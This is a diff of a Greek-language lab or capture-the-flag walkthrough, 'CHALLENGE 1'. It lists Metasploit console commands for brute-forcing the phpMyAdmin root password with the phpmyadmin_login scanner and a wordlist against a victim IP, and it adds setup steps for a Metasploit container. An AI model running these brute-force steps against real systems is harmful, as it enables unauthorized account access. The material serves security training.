@@ -1,18 +1,22 @@
 
 CHALLENGE 1
 
+Τρέχουμε ./build.sh
+Θα χτιστεί ολόκληρη η εφαρμογή και θα μας βάλει μέσα στο container που τρέχει το metasploit. Θυμίζουμε ότι το 
+metasploit πρέπει να τρέξει στο port 443 που χρησιμοποιείται για πρόσβαση σε ιστοσελίδες (https) 
+
 ΜΕΡΟΣ 1 - ΑΠΟΚΤΗΣΗ ΚΩΔΙΚΟΥ ΤΟΥ PHPMYADMIN
 (credits : https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/http/phpmyadmin_login)
-1)sudo msfconsole -μπαινουμε στο gui του metasploit
+1)./msfconsole -μπαινουμε στο gui του metasploit
 Πρώτα πρέπει να βρούμε τον κωδικό του root
 2)search phpmyadmin (διαθέσιμα payloads για phpmyadmin)
 3)search type:auxiliary phpmyadmin (συνήθως τα payloads για bruteforce είναι στα auxiliary)
 4)use 0 (login scanner). Το payload αυτό θα σπάσει τον κωδικό του phpmyadmin με bruteforce.
-5)set RHOST 192.168.2.15 (victim IP)
+5)set RHOST 192.168.x.x (victim IP)
 6)set RPORT 8080 (victim PORT)
 set STOP_ON_SUCCESS true (μόλις βρεθεί ο κωδικός σταματάμε)
 set TARGETURI / (directory του phpmyadmin)
-set PASS_FILE  /../../(τοποθεσία της λίστας που θα χρησιμοποιησουμε για το bruteforce. Η καλύτερη είναι η rockyou.txt - )
+set PASS_FILE  /home/msf/wordlist/wordlist.txt(τοποθεσία της λίστας που θα χρησιμοποιησουμε για το bruteforce)
 set username root (ξέρουμε το username και ψάχνουμε τον κωδικό)
 run
 Αν όλα πήγαν καλά, έχουμε τον κωδικό.
